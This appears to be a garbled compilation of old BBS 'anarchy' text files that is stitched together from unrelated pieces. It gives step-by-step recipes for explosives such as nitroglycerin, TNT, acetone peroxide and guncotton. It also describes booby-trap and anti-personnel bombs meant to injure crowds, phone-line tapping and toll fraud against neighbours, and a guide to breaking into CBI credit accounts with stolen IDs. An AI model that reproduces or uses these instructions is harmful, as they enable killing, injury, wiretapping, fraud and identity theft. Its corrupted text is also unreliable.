the file first, you sill realize now tHat your area code is about to become
null! Then, getting back, twitch the pole/remote control and run for your
damn life. Anywherel ofuust get away from it. It will be generating so much
electricity that if you stand to close you will kill yourself. The generator
will smoke, etc. but will not stop. You are now killing your area code,
because all of that energy is spreading through all of the phone lines around
you in every direction.
   Have a nice day!

This file will explain the construction, troubleshooting,
This design will make them last 10 months!!!!!!  But
nevertheless, don'tforget to put in aswitch for on and off.  Ok
let's build  the two VCO'S andcalibrate the unit before we get to
the keyboard construction.


VCO CONSTRUCTION

TOOLS REQUIRED
1 ocilliscope(optional but not req)
1 Freq. counter   (REQUIRED)
1 Volt meter       "  "  "
Electronics tools  (Pliers, drll, screwdrivers, etc.)


PARTS

R2  1K   RESISTOR  5%
C1 .1uf  ELECTROLYTIC CAPACITOR 16VDC
C2 .01uf  "        "  (MYLQR)   16VDC
C1 2207 VCO CHIP BY EXAR ELECTRONICS

Remember the above only says VCO#1 but the same is for VCO#2

R3-R4 150 OHM RESISTORS  5%         .
C3-C4 .1 uf ELECTROLITIC CAPACITOR  .
10VDC                         .

P1-P10 200K TRIMMER POT - 20 TURNS DIODES USED IN THE KEYBOARD
ARE 1N914 TYPE(40 OF THEM) & 13 SWITCHES FOR THE KEYBOARD SPST
MOMENTARY.

SPKR YOU CAN USE A TELEPHONE SPEAKER FOR THIS (IT WORKS BEST) BUT
REMEMBER TOTAKE OUT THE DIODE THAT IS CONNECTED ACCROSS IT.


IMPORTANT NOTES

1. DO NOT USE ANYTHING ELSE OTHER THAN A MYLAR CAPACITOR FORC2.
2. PINS 10,9,8 SHOULD BE TIED TOGETHER AND BE LEFT FLOATING.
3. ALL RESISTORS SHOULD BE 5%!  NOTHING ELSE!
4. A TELEPHONE SPEAKER GIVES THE BEST RESULTS.


TROUBLE SHOOTING

By now you should have constructed the two VCO'S on a bread board
or anything that pleases you.  Check for cold solder
joints,broken wires,polarity of the battery, etc.  Before we
apply power to the VCO'S we have to adjust the pots for their
half way travel point.  This is done by turning them 21 turns to
the right and then 10 turns to the left.  Do the same for all ten
of them.

Now apply power to the unit check to see that you have power in
the chips by putting the positive lead of your volt meter on pin
7 andthe negative lead on pin 12.  If you do not have anything
there turn off the unit and RECHECK THE WIRING.

When you get the right voltages on the chips, connect a diode to
a piece of wire (look at fig. 2 for the orientation of the diode)
from round to any pot at point T (look carefully at the schematic
for point T it is labeled T1-T10 for all pots). You should be
able to hear a tone, if not disconnect the lead and place the
speaker close to your ear and if you hear a chirp-like sound,
this means that the two VCO'S are working if you don't,
it means that either one or both of the VCO'S are dead.  So in
this case it is always good to have an ocilloscope on hand.
Disconnect the speaker from the circuit and hook the ocilliscope
to 1 of the leads of the speaker & the ground from the scope to
the ground of the battery. Connect again the ground lead with the
diode connected to it  from ground to any pot on the VCO that you
are checking and you should see a triangle wave if not turn the
pot in which you are applying the ground to until you see it.
When you do see it do the the same for the other VCO to makesure
it is working. (amplitude is about 2VAC). When you get the two
VCO's working you are set for the adjustment of the individual
spots.


ADJUSTMENT

Disconnect the speaker from the circuit and connect a freq.
counter (the positive lead of the counter to one of the speakers
leads that belongs to VCO#1 or connect it to pin 14.

Connect the negative lead to the battery negative and connect the
jumperlead with the diode from ground to pot number 1.T1 (the
first pot number 1 point T1).  If you got it working you should
hear a tone and get a reading on the counter.  Adjust the pot for
a  freq. of 1700hz and continue doing the same for pots 2-5
except that they get different freqs. which are:

:            $$$$$$$$$$$$$$           :
:            $            $           :
:            $ P1 1700hz  $           :
:            $ P2 1300hz  $           :
:            $ P3 1100hz  $  Therm1 17            $ P4  900hz  $           :
:            $ P5 1500hz  $           1 17            $            $  Therm1
:            $$$$$$$$$$$$$$           :

Now disconnect the freq. counter from the speaker lead of VCO#1
or from pin (which ever you had it attached to at the beginning)
and connect it to the speaker lead of VCO#2 or to pin 14 of VCO#2
and make the same adjustments toP6-10.:

:            $$$$$$$$$$$$$$$ Therm1
:            $  T          $  T       1 17            $ P6  1100hz  $  T       1 17            $ P7   700hz  $          1
:            $ P8   900hz  $ Therm1
:            $ P9  2600hz  $ Therm1
:            $ P10 1500hz  $ T        1 17            $             $  T       1 17            $$$$$$$$$$$$$$$  T       :

When you finish doing all of the pots go back and re-check
them.


KEYBOARD

IF YOU LOOK AT FIG-2 YOU WILL SEE THAT THE KEYS ARE
SIMPLE SWITCHES. CONNECTED TO A GROUND AND TWO DIODES ON THE
OTHER END. THESE DIODES ARE USED TO SIMPLIFY THE CONSTRUCTION OF
THE KEYBOARD BECAUSE OTHERWISE THE DISTRIBUTION OF THE GROUND
SIGNAL FOR BOTH VCO'S WOULD HAVE BEEN DONE MECHANICALLY.  THE
DIODE WILL GO TO VCO#1 AND THE OTHER WILL GO TO VCO#2. FIG-3
SHOWS THE ARRANGEMENT OF THE KEYS ON THE KEYBOARD.

BELOW IS A TABLE THAT WILL HELP YOU CONNECT THE KEYS TO THE
REQUIRED VCO'SPOTS.

REMEMBER THAT IN FIG-2 IT'S THE SAME FOR EACH KEY EXCEPT THE "X"
KEY, WHICH ONLY TAKES ONE DIODE.




                            The Chemists Corner:  #1

I.  Common "weak" explosives:

 A. Gunpowder:
     75% Potassium nitrate
     15% Charcoal
     10% Sulfur

     The chemicals should be ground into a fine powder SEPARATELY! with a mortar
and pestle.  If gunpowder is ignited in the open,it burns fiercely, but if in a
closed space it builds up pressure from the released gases and can explode the
container.  Gunpowder works like this:  the Potassium nitrate oxidizes the
charcoal and sulfur, which then burn.  Carbon dioxide and Sulfur dioxide are the
gases released.

 B. Ammonal:
     Ammonal is a mixture of ammonium nitrate with aluminum powder.  I am not
sure of the % composition for ammonal, so you may want to experiment a little
using small amounts.

 C. Chemically ignited explosives:

     1. A mixture of 1 part potassium chlorateExt5 parts table sugar burns
fiercely and brightly ( similar to that of magnesium ) when 1 drop of
concentrated sulfuric acid iectrione hon it.  What occurs is this:  when the acid
is added it reacts with the potassium chlorate to form chorine dioxide, which
explodes on formation, burning the sugar as well.

     2. Using various chemicals
  a mixture has been developed that works well exfor imitating volcanic eruptions.  Given the name "MPG Volcanite" by Zaphod
Beeblebrox/MPG.  Here it is:
     Potassium chlorate + potassium perchlorate + ammonium nitrate + ammonium
dichromate + potassium nitrate + sugar + sulfur + iron filings + charcoal + zinc
dust + some coloring agent. ( red = Strontium nitrate, purple = iodine crystals,
yellow = sodium chloride, crimson = calcium chloride, etc...)

     3. So do you think water puts out fires?  In this one, it starts them. Mix;
ammonium nitrate + ammonium chloride + iodine + zinc dust.  When a drop or two
of water is added, the ammonium nitrate forms nitric acid which reacts with the
zinc to produce hydrogen and heat.  This may also ignite the hydrogen and begin
burning.
     Ammonium nitrate:  8 g.
     Ammonium chloride: 1 g.
     Zinc dust:         8 g.
     Iodine cdata  bstals:   1 g.

     4. Potassium Permanganate + glycerine when mixed produces a purple colored exflame in 30 seconds to 1 minute.  Works best if the potassium permanganate is exfinely ground.

     5. Calcium carbide + water releases acetylene gas
  as used in blow torches.

II.  Thermite reaction:

     The thermite reaction is used in welding, because it generates molten iron
and temps. of 3500 C (6000 F+).  It uses one of the previous reactions to start
it.
     Starter:  Potassium chlorate + sugar.
Main pt.:  Iron (III) oxide + aluminum powder (325 mesh or finer).
Put the potassium chlorate + sugar around and on top of the main pt. to start
the reaction, place one drop of concentrated sulfuric acid on top of the starter
mix.  Step back!  The ratios are: 3 parts iron(III) oxide, 1 part aluminum
powder, 25g potassium permanganate, 6 ml glycerine.

III. Nitrogen-containing high explosives:

 A. Mercury (II) fulminate
     To produce this very shock sensitive explosive, one might assume that it
could be formed by adding fulminic acid to mercury.  This is somewhat difficult
since fulminic acid ie very unstable and cannot be purchased. Although fulminic
acid is not needed for this explosive.
     You add 2 parts nitric acid to 2 parts alcohol to 1 part mercury.  This is
theoretical ( not tried yet ) so please if you try this, do it in very small
amounts and let me know the results.

 B. Nitrogen Triiodide:
     This is a very powerful and shock sensitive explosive.  Never store it and
be careful for air movements, and other tiny things could set it off.
  Materials:
     2-3g Iodine
     15ml Conc. Ammonia
     8 Sheets of filter paper
     50ml Beaker
     Feather on a 10ft pole
     Ear plugs
     Tape
     Spatula
     Stirring rod

     Add iodine to ammonia in the beaker.  Stir, let stand for 5 minutes.  Do
the following within 5 minutes!!  Retain the solid, and pour off the liquid.
Scrape the brown solid onto a stack of four sheets of filter paper.  Divide
solid into four parts, putting each on a sheet of dry filter paper.  Tape in
position.  Leave to dry undisturbed for at least 30 minutes.  To detonate, touch
with the feather.  Wear the ear plugs while doing this...it is very loud!

 C. Cellulose Nitrate ( Guncotton )
     Commonly known as smokeless powder because it does not give off smoke as it
burns.



  Materials:
     70ml Conc. sulfuric acid
     lizelizelnc. nitric acid
     5g Absorbent cotton
     250ml 1M sodium bicarbonate
     250ml Beaker
     Ice bath
     Paper towels

     Place 250ml beaker in the ice bath, add 70ml sulfuric acid, 30ml nitric
acid.  Divide cotton into .7g pieces.  With tongs, immerse each piece in the
acid solution for 1 minute.  Next rinse each piece in 3 successive baths of
500ml water.  If it bubbles, rinse in water once more until no bubbles occur.
Squeeze dry and spread on paper towels to dry overnight.


IV.  Other stuff

 A. Peroxyacetone:
     This is extremely flammable and has been reported to be shock sensitive.
  Materials:
     4ml Acetone
     4ml 30% Hydrogen peroxide
     4   Drops Conc. Hydrochloric acid
   150ml Test tube

     Add acetone and hydrogen peroxide to the test tube.  Then add hydrochloric
acid.  In 10-20 minutes a white solid should begin to appear.  If no change is evident, warm the tube in a water bath at 40 C.  Allow the reaction to continue exfor two hours.  Swirl the slurry and filter it.  Leave out on filter paper to
dry for at least two hours.  To ignite. light a candle tied to a meter stick and
light it.

 B. Smoke...Smoke...And more Smoke:
     The following reaction should produce a fair amount of smoke.  Since this
reaction is not all that dangerous you can use larger amounts if necessary for
more smoke.
     Mix 6g zinc powder + 1g sulfur powder.  Insert a red hot wire into the pile
and step back as much smoke should be produced.

          fic mmon "hemists Corner:  #2

This article has instructions on how to do some interesting experiments with
common household chemicals.  It is suggested that you have some knowledge of
chemistry before attempting some of these experiments.

I. A list of household chemicals and their composition

Vinegar:           3-5% Acetic acid
Baking soda:       Sodium bicarbonate
Drain cleaners:    Sodium hydroxide
Sani-flush:        75% Sodium bisulfate
Ammonia water:     Ammonium hydroxide
Citrus fruit:      Citric acid
Table salt:        Sodium chloride
Sugar:             Sucrose
Milk of Magnesia:  Magnesium hydroxide
Iodine:            47% Alcohol, 4% iodine
Rubbing alcohol:   70-99% Isopropyl alcohol.

Exp #1:  Fizz
     Mix vinegar with baking soda.  This produces sodium acetate and carbonic
acid.  The carbonic acid quickly decomposes into carbon dioxide and water making
the fizz.

Exp #2:  Batteries
     1 Citrus fruit
     1 Zinc strip
     1 Copper strip

     Just stick the zinc and copper strips at opposite ends of the fruit and you
have a 1.5 volt battery.

Exp #3:  Generating chlorine gas
     This is slightly more dangerous than the other two, so you should know e you e ablou're doing before you try this...
     If you ever wondered why ammonia bottles say "DO NOT MIX WITH CHLORINE
BLEACH", it is because if you do, it will give off chlorine gas.  To capture it,
get a large bottle.  Since the chlorine is heavier than air, it will stay in the
bottle unless you use large amounts.  DON'T!  For something fun to do with
chlorine read the following experiments...


Exp #4:  Chlorine + turpentine
     Take a small cloth or rag and soak it in turpentine.  Quickly drop it into
the bottle of chlorine.  It should give off a lot of black smoke and probably
start to burn.

Exp #5:  Creating hydrogen gas
     To generate hydrogen, all you need is an acid and a metal that will react
with it.  Try vinegar or sulfuric acid with zinc or aluminum.  You can collect
hydrogen in something if you note that it is lighter than air...Light a small
amount and it burns with a small "POP".
     Another way of creating hydrogen is by the electrolysis of water.  This
involves  separating water ( H20 ) into hydrogen and oxygen by an electric
current. To do this, you need a 6-12v battery, two test tubes, a large bowl, two
wire electrodes, and sulfuric acid.  Dissolve the acid in a large bowl of water.
Submerge the test tubes in the water and put the electrodes inside them.  With
the mouth of the tube aiming down.  Connect the battery to the wire electrodes.
As the reaction is allowed to occur, hydrogen will be produced in one tube and
oxygen in the other.  The tube with more space than the other is the one with
the hydrogen since water is H2O:  2 parts hydrogen to 1 part oxygen.

Exp #6:  Chlorine + hydrogen
     Take the test tube of hydrogen and cover the mouth with you thumb.  Keep it
inverted, and bring it near the bottle of chlorine not previously used.  Say
"Goodbye test tube", and drop it into the bottle.  The hydrogen and chlorine
should react and possibly explode.  The interesting thing about this is that
they will not react if it is dark and no heat is present.  When a light is
turned on, enough energy is present to cause them to react...

Exp #7:  Preparation of oxygen
     Get some hydrogen peroxide and manganese dioxide ( the black powder from a
battery ).  Mix the two in a bottle, and they give off oxygen.

Exp #8:  Alcohol for party tricks
     Buy some rubbing alcohol.  Soak a towel in water and then in alcohol. Light
the towel on fire.  When it finishes burning the alcohol, the flame should go
out leaving the towel unharmed.

Exp #9:  Iodine?
     Tincture of iodine contains mainly alcohol and a little iodine.  To
separate them, put some iodine in a metal lid to a bottle and heat it over a
candle.  Have a stand holding another metal lid with ice in it about 4-6 inches
over the tincture.  The tincture of iodine should then sublime into cdata  bstals on
the upper lid.  I haven't tried this yet but if it works you can use this for
the experiments in article #1.

Exp #10:  Your own grain elevator explosion
     Get a candle and some flour.  Light the candle and put some flour in your
hand.  Try various ways of getting the flour to leave you hand and become dust
over the candle flame.  The enormous surface area allows all the tiny dust
particles to burn all at about the same time creating a fireball effect. If you
can get you hands on some lycopodium powder, this will work much better,
creating huge unexpected fireballs.

                  How to make Nitroglycerin and How to use it.

Nitro is a very powerful high explosive. The byproducts of nitro is nothing but
nitrogen, carbon dioxide, water, and oxygen.

     To make nitro.

     Mix 100 parts fuming nitric acid, with specific gravity of 50 degrees
baume, with 200 parts sulphuric acid. This is going to be hot at first.  It
won't splatter if you pour the nitric into the sulphuric.  The acid solutions
together can dissolve flesh in a matter of seconds so take care when using
them!!  When cool, add 38 parts glycerine as slowly as possible.  Let it trickle
down the sides of the container into the acids or it won't mix thoroughly and
the reaction could go to fast which causes enough heat to ignite itself. If you
see the mixture turn brown or look funny, run like hell!!  This means it is
about to explode!  (Nitroglycerin can fill up to 10,000 times it's original area
with expanding gases.  This means that if you have 10ml's somewherel it will
produce 100,000ml of gases).  Stir with a GLASS rod for 15 seconds then
carefully pour it into 20 times it's volume of water.  It will visibly
precipitate immediately. There will be twice as much nitro as you used glycerine
and it is easy to separate. Mix it with baking soda as soon as you have
separated it this helps it not to go off by itself.

NOTES:  Parts are by weight and the baume scale of specific gravity can be found
in most chemistry books.  You can get fuming nitric and sulfuric acids wherever
good chemicals or fertilizers are sold.  It is positively STUPID to make more
than 200 grams of nitro at time.  When mixing the stuff wear goggles, gloves,
etc.  One experience of having the stuff going off by itself blew both a window
and the table it was sitting on away.  This was done with only 25g of the stuff.

     Once you have made the nitro and saturated it with bicarb. you can make a
really powerful explosive that won't go off by itself by simply mixing it 
         fieasy uch cotton as you can and them saturating that with molten wax...just enough
to make it sealed and hard. Typically, use the same amounts ( by weight ) of
each nitro, cotton and wax. This when wrapped in newspaper was once known as "
Norbin & Olson's patent dynamite "  but that was back in 1896.




                                How to make TNT

1.   Get two clean beakers.  In the first, prepare a solution of 76% sulfuric
acid, 23% nitric acid and 1% water.  In the other beaker prepare another
solution of 57% nitric acid and 43% sulfuric acid.  Percentages are on a weight
ratio, not by volume.

2.   Ten grams of the first solution are poured into an empty beaker and placed
in an ice bath.

3.   Add ten grams of toluene, and stir for several minutes.

4.   Remove this beaker from the ice bath and gently heat until it reaches 50
degrees C.  The solution is stirred constantly while being heated.

5.   Fifty additional grams of the acid from the first beaker are addedEand the
temperature is allowed to rise to 55 C.  This temp is held for the next ten
minutes.  an oily liquid will begin to form on the top of the acid.

6.   After 10-12 minutes, the acid solution is returned to the ice bath, and
cooled to 45 C.  When reaching this temp.  the oily liquid will sink and collect
at the bottom of the beaker.  At this point, the remaining acid solution should
be drawn off using a syringe.

7.   Fifty more grams of the first acid solution are added to the oily liquid
while the temp. is slowly being raised to 83 C.  After this, the temp. is
maintained for 30 minutes.

8.   At the end of this period, the solution is allowed to cool to 60 C, and is
held at this temp. for another 30 minutes.  The acid is then again drawn off,
leaving once more only the oily liquid at the bottom.

9.   Thirty grams of sulfuric acid are added, while the oily liquid is gently
heated to 80 C.  All temperature changes must be accomplished slowly and gently.

10.  Once the desired temperature is reached, 30 grams of the second solution
are addedEand the temperature is raised from 80 to 104 C, and is held for 3
hours.

11.  After the 3 hours, the mixture is lowered to 100 C and is held for 30
minutes.

12.  The oil is then removed from the acid and washed in boiling water.

13.  While washing with boiling water, the TNT will begin to solidify.

14.  When it starts to solidify, cold water is added to the beaker, so that the
TNT will form into pellets..  Once this is done, you have a good quality TNT
which is very stable and can be melted at 82 C.

 This diagram can be interpreted as:
  P.B = Pushbutton
  The 6 volt battery can be replaced
  with either a 9 or 12 volt battery,
  if you do so, you must also change
  the resistor value to the following:
    Batt    Res. Value
     6v        240
     9v        360
    12v        480
 Make sure you don't use this on
 operator orignated calls. Otherwise
 this particular box plan is VERY VERY
 safe. When using it, after you answer
 the party will never know you are
 therel so you can screen calls that
 way .. work out a code with your
 friends who you'll allow to be Black
 Boxed, make it so they whistle while
 it is ringing or something so you
 know it's safe when you pick up to
 hit the pushbutton to kill the
 ringing. This is very important, if
 you DON'T hear the signal, DON'T
 black box that call! You can be
 nabbed if you mess up.

          This is a fairly simple modification that can be made to any phone.
All it does is allow you to take any 2 lines in your house and create a party
line. So far I have not heard of Any problems with it from my friends that have
set one up and I have not had any either. There is one thing that you will
notice when you are one of the two people who is called by a person with this
box. The other person will sound a little bit faint.  I could overcome this
with some amplifiers but then there wouldn't be very many of these boxes made.
I think that the convenience of having two people on line at any one time will
make up for the minor volume loss.

           In some houses the black and yellow are already wired in others you
will have to go out to your box and rewire it. A good way to figure out which
line is which is to take the phone you are looking for off the hook.  Then you
only need to take the red and green wires entering your phone and hook them
to the different pairs of red and green going into the house.  You can't hurt
anything in the phone or telephone by probeing.  When you find the pair that
you want take the black from your line and attach it to the red of the other
line then take the yellow and attach it to the green line.  Now you are all set
to go.  For people with rotary phones you can have one person call you then
place the second call out to the other persOn. Though not phreakers tool, the
brown box can be phun.

               Budbox

This is a portable unit. "It is
extremly handy for free voice calls
and tapping a near by house's line.
It's really easy to make so don't
worry about it (unlike a blue box!).

Materials required to build the Bud Box
========= ======== == ===== === === ===

(2) alligator clips
(1) one peice fone or (1) normal fone
    (one peice is easier.)
some good wire
(1) soldering iron
some solder

Contruction of the Bud Box:
=========== == === === ====

1)  Cut the wire that connects the
fone to the wall. Inside there should
be 4 colored wires. Yellow, red,
green, and black. If the wire are not
colored, no need to get worried. The
two in the middle are red reen.
Those are the two you need.

2)  Make sure to keep about 1-2 feet
of this wire connected to the fone
unless you want to use the other wire
listed above. Now solder one alligator
clip to the green wire, and one the
red.

3)  If you're using the other wire,
strip the ends and solder one end to
of each to the red and green on the exfone, and one end to an alligator
clip.

4)  Go to a near by house and locate
the little gray box. It's simple to
find, look by the gas meter. It should
have the Bell logo on it.

5)  To open this thing, put your hand
underneath it and hit upwards. You
should get contact with the bottom
edge of it.

6)  Now it should come open nice and
easy. Look inside and you will see exfive screws in this pattern:

                *     *

          f        *

          f     *     *

7)  The screw in the middle and the
two on the left do nothing. (You may
want to check the two on the left,
some people have a second line hooked
up to these two.) All you need to
worry about are the two on the right.
The one in the  1 right-hand corner is
usually the green, and the one in the
bottom right-hand corner is usually
the red.

8)  Clip an alligator clip to the
corresponding terminals. (Red to red,
the green to green.) You should get a
dial tone. If you don't, switch the
alligator clips around. If you still
don't get a dial tone (or someones
conversation!) then the line has
probably been disconnected or the fone
is off the hook.

Ideas of use for the Bud Box
===== == === === === === ===

Get ALOT of wire and run it into your
house. Then you'll be an extension of
that line. The fone will ring and you
can listen to everything thats going
on on the that line.

You can call direct to any place using
normal Bell service (GASP!). i.e.:
1-702-831-4263. The bill will be not
be charged to you. It will be charged
to your neighbors (or whoever.).

If you want to have two lines to call
(providing the house that the line is
from is always vacant.), you can just
dial: 444-1787 and you should get a
recording stating what number it is.
To test this, dial the number the
recording says, if it's busy, you're
set.

   -=*> HOW TO MAKE A BULB BOMBive:<*=-
            THE FIRST WAY...

      -=*> BY - VORPAL BLADE <*=-


             - MATERIALS -

1) A FEW LIGHT BULBS
2) TORCH (ONE THAT WILL MELT GLASS,
   RADIO SHACK SINGLE CYLINDER MODEL.)
3) GASOLINE
4) LIQUID SOAP
5) EPOXY GLUE

          f   - PROCEDURE -

1) MAKE A HOLE IN THE LIGHT BULB ABOUT
   HALF AN INCH BELOW THE METAL PART.
   (DON'T MAKE IT ON THE BOTTOM,
   BECAUSE IF THE SEAL YOU WILL MAKE
   SHOULD BREAK, THE PERSON/ROOM YOU
   WANT TO ELIMINATE WILL NOTICE THE
   HOLE (THE GASOLINE WILL DRIP ON THE
   FLOOR!).

2) NOW, CAREFULLY FILL THE LIGHT BULB
   ABOUT  HALF  FULL WITH GAS, AND THEN
   THE REST WITH SOAP (HOLD AT AN ANGLE
   IF YOU HAVE TO).  NOW, USE THE EPOXY
   GLUE AND GLUE THE HOLE SHUT.

3) THIRDLY, TAKE THE EPOXY GLUE AND
   GLUE OVER THE HOLE.

4) FINALLY, FIND A LIGHT SOCKET AND
   SCREW THE BULB IN. MAKE SURE THE
   LIGHT IT OFF. IF IT IS ON, THEN, I
   WILL SEND FLOWERS. DON'T TEST IT,
   UNLESS YOU ARE COMMITTING SUICIDE!

   THIS IS AN ANTI-PERSONNEL BOMB MEANT FOR MILLING CROWDS. THE BOTTOM OF A SOFT
DRINK CAN IS HALF CUT OUT AND BENT BACK. A GIANT FIRECRACKER OR OTHER EXPLOSIVE
IS PUT IN AND SURROUNDED WITH NUTS AND BOLTS OR ROCKS. THE FUSE IS THEN ARMED
WITH A CHEMICAL DELAY IN A PLASTIC DRINKING STRAW.

   AFTER FIRST MAKING SURE THERE ARE NO CHILDREN NEARBY, THE ACID OR GLYCERINE
IS PUT INTO THE STRAW AND THE CAN IS SET DOWN BY A TREE OR WALL WHERE IT WILL
NOT BE KNOCKED OVER. THE DELAY SHOULD GIVE YOU THREE TO FIVE MINUTES. IT WILL
THEN HAVE A SHATTERING EFFECT ON PASSERBYS.

   IT IS HARDLY LIKELY THAT ANYONE WOULD PICK UP AND DRINK FROM SOMEONE ELSE'S
SOFT DRINK CAN. BUT IF SUCH A CRUDE PERSON SHOULD TRY TO DRINK FROM YOUR BOMB
HE WOULD BREAK A NASTY HABIT FAST!

YOU WILL NEED:-

A METAL CAN WITH A PRESS ON LID.  EXAMPLES ARE PAINT CANS, OR HERSHEY'S COCO
OR NESTLE'S QUIK CANS.  THE NEW PAPER CANS WILL WORK TOO BUT THEY WEAR OUT
FAST. A TANK OF ACETYLENE OR THE ACETYLENE GENERATOR FROM THE PRECEEDING FILE
IN THIS SERIES <FZFF03>.

THE SETUP/ASSEMBLY:-

     DRILL OR POKE A SMALL HOLE IN THE MIDDLE OF THE BOTTOM OF THE METAL CAN
OF 1/16" OR LESS, DIAMETER.   DRILL OR POKE A SIMILAR HOLE IN THE MIDDLE OF THE
LID OF THE CAN.  PUT A PIECE OF WATERPROOF TAPE (LIKE BLACK ELECTRICIANS TAPE)
OVER THE OUTSIDE OF EACH HOLE.

USING IT:-

     THE EASIEST WAY TO SAFELY LOAD THE "CANON" IS TO BEGIN BY FILLING IT WITH
WATER AND THEN USING IT IN A COLLECTION TROUGH (LIKE THE ONE SHOWN IN FZFF03;
ACETYLENE GAS).   THE BUBBLER TUBE CAN BE CONNECTED TO AN ACETYLENE TANK SUCH
AS ON A WELDERS TORCH, OR THE ACETYLENE GENERATOR OR BAGS OF ACETYLENE FILLED
IN PRINCIPLE:-

     ONCE YOU TAKE THE <NOW LOADED> "CANON" TO WHERE YOU WANT TO USE IT, BY
SETTING THE CAN ON SOMETHING THAT WILL KEEP IT OFF THE GROUND AND IS
VENTILLATED UNDERNEATH, COUNTDOWN CAN BE STARTED.  REMOVE THE TAPE FROM BOTH
HOLES.  SINCE ACETYLENE I_IGHTER THAN AIR, AIR WILL BEGIN ENTERING THE BOTTOM
HOLE AS ACETYLENE FLOATS OUT THE TOP.  THE FLOW IS JUST ABOUT RIGHT TO MAKE A
LANTERN FLAME ABOVE THE EXIT HOLE AT THE TOP.  PROMPTLY LIGHT THE TOP HOLE OF
THE CAN AND AND GET BACK, DELIBERATELY, AS YOU WILL HAVE SEVERAL MINUTES TO
WAIT.  (THE TIME DEPENDS ON THE SIZE OF THE CAN YOU USE AND THE SIZE OF THE
PINHOLES YOU PUT IN IT.)

     AT THC BEGINNING, THE CAN CONTAINS AND VENTS ONLY ACETYLENE SO THAT ONLY
ABOVE THE CAN CAN IT GET ENOUGH AIR TO BURN, AND ONLY THE GAS WHICH HAS EXITE 
IS FLAMABLE.  AS AIR COMES IN THE BOTTOM, THOUGH, IT BEGINS TO MIX WITH THE
GAS INSIDE THE CAN SO THAT THE MIXTURE BECOMES INCREASINGLY ACTIVATED WITH
OXYGEN. EVENTUALLY THE AIR LEVEL WILL REACH ITS FLASH RATIO, AND THE FLAME FROM
THE TOP OF THE CAN WILL MOVE DOWN INSIDE, IGNITING ALL THE ACETYLENE THAT
REMAINS INSIDE THE CAN AT ONCE, AND THE "CANON" GOES OFF.

FIRING PHILOSOPHIES:-

     STRAIGHT OFF YOU WILL SEE THAT YOU HAVE A CHOICE OF SETTING OFF THE SHOT
WITH THE LID UP (TO SHOOT THE LID) OR THE LID DOWN (TO SHOOT THE CAN) INTO THE
AIR.  ALSO, BECAUSE THE FUSE FLAME IS SENSITIVE TO WIND, YOU MAY WANT TO
FASHION A CHIMNEY (OR "BARREL") OUT OF ANOTHER CAN, A ROLL OF LINOLEUM OR
FORMICA, OR A LENGTH OF PVC PIPE OF SUITABLE DIAMETER.  THIS HAS TWO ADDITIONAL
ADVANTAGES BEYOND KEEPING THE FLAME LIGHTED, IN THAT IT DRAMATICALLY ENHANCES
THE BOOM, BUT ALSO IMPROVES YOUR CONTROL OVER THE DIRECTION OF THE PROJECTILE
EJECTED.

     BY LOADING MANY CANISTERS WITH THEIR HOLES TAPED, BEFORE HAND, YOU THEN
HAVE YOURSELF AN EASY RELOADER, CARTRIDGE FASHION.

     ANOTHER VARIATION IS TO PUT THE PINHOLES ON OPPOSITE SIDES OF THE METAL
CAN AND THEN MOUNTING IT IN THE "BARREL" HORIZONTALLY.  IN THIS CASE, A
BACKSTOP IS NEEDED AND THE CHIMNEY CANNOT BE PART OF THE "BARREL".

     SOME OF MY BEST SHOTS HAVE BEEN 5 GAL ICE CREAM CARTON OR HAT BOX ONE-
SHOTTERS, FILLED DRY FROM AN ACETYLENE TANK AT A WIDE SETTING.  BECAUSE OF THE
UNCERTAINTY OF THIS FILL METHOD, THESE CANONS WERE LIT WITH SPARKLERS ON THE
END OF A 12 FOOT POLE.

     THIS KIND OF CANON READILY LENDS ITSELF TO LOUDNESS, ALTITUDE AND
DISTANCE COMPETITIONS, SINCE IT'S ALL HAND MADE.

          f                     THANKS TO: ZANGIN


         THE FOLLOWING IS THE LOGIN PROCEDURE TO LOGIN TO A C.B.I. SYSTEM,
  A FEW C.B.I. LOGIN PORT NUMBERS, INFORMATION ON THE SYSTEM, AND OBTAIN C.B.I.
  ACCOUNTS.


 *** HOW TO GET CBI INFORMATION ***

         OK, YOU CAN GET CBI ACCOUNTS AND CBI PRINTOUTS AT YOUR LOCAL MALL.
 THE BEST PLACES TO CHECK ARE:  INSURANCE PLACES, LAWYERS, DOCTORS, AND CAR
 DEALERSHIPS, AND CHECK SOME PLACES IN THE MALL THAT MIGHT HAVE TO CHECK A
 PERSON'S CREDIT.  TRASH IN THEIR DUMPSTER LOOKING FOR PRINTOUTS.  MOST PLACES
 BUFFER CAPTURE THEIR WHOLE CALL TO CBI INCLUDING THE NUMBER, EVERYTHING ON
 BUFFER, IT'S BETTER THAN CHRISTMAS.  OK, SO LOOK OBTAIN THESE CBI PRINTOUTS
 AND CRUISE HOME TO THE OLD COMPUTER.

 *** WHAT YOU NEED ***

         THE NEXT STEP SHOULD BE, OBTAIN A DRIVERS LICENSE OR SOME OTHER FORM
 OF ID THAT CONTAINS A PERSON'S NAME, ADDRESS, AND SOCIAL SECURITY NUMBER.  IF
 YOU DO NOT HAVE THIS, YOU CAN'T GET SHIT, YOU DEFINITELY NEED THEIR SOCIAL
 SECURITY NUMBER FOR THIS.  THE BEST THING TO DO IS GO CASING (* CHECK OTHER
 X ORGANIZATION FILES ON CASING *) AND STEAL A WALLET CONTAINING A DRIVERS
 LICENSE.

 *** STEPS TO ACCESSING CBI ***

         SECONDLY, YOU SHOULD EXAMINE THE WHOLE PRINTOUT, AND MAKE SURE YOU
 CAN READ EVERYTHING ON THE PRINTOUT, YOU DON'T WANT TO FUCK IT UP, BE AS
 EFFICIENT AS POSSIBLE, EVEN THOUGH CBI DOES ALLOW YOU TO MAKE SOME MISTAKES
 BEFORE IT DISCONNECTS.

 *** LOGIN TO CBI ***

         NOW, YOU SHOULD HAVE EVERYTHING SET OUT NEXT TO YOU FOR QUICK ONLINE
 REFERENCE.  DIAL THE NUMBER AT 300 BPS, E, 7, 1.  CHECK ON THE PRINTOUT IF THE
 CBI PORT HAS MORE THAN 300 BAUD, IT JUST MIGHT.  IF YOU CANNOT FIND A LOCAL
 PORT FOR CBI TRY 1-800-624-1395.  NOTE: EVERYTHING IN < > IS ME MAKING A NOTE.

  accounts.

 *** HOW TO GET CBI INFORMATION ***



         Ok, you can get CBI accounts and CBI printouts at your local mall.
 The best places to check are:  Insurance Places, Lawyers, Doctors, and Car
 Dealerships, and check some places in the mall that might have to check a
 person's credit.  Trash in their dumpsteng forouts.  places
 buffecaptheir whole call to CBI including the number, everything on
 buffer, it's better than christmas.  Ok, so look obtain these CBI printouts
 and cruise home to the old computer.

 *** WHAT YOU NEED ***

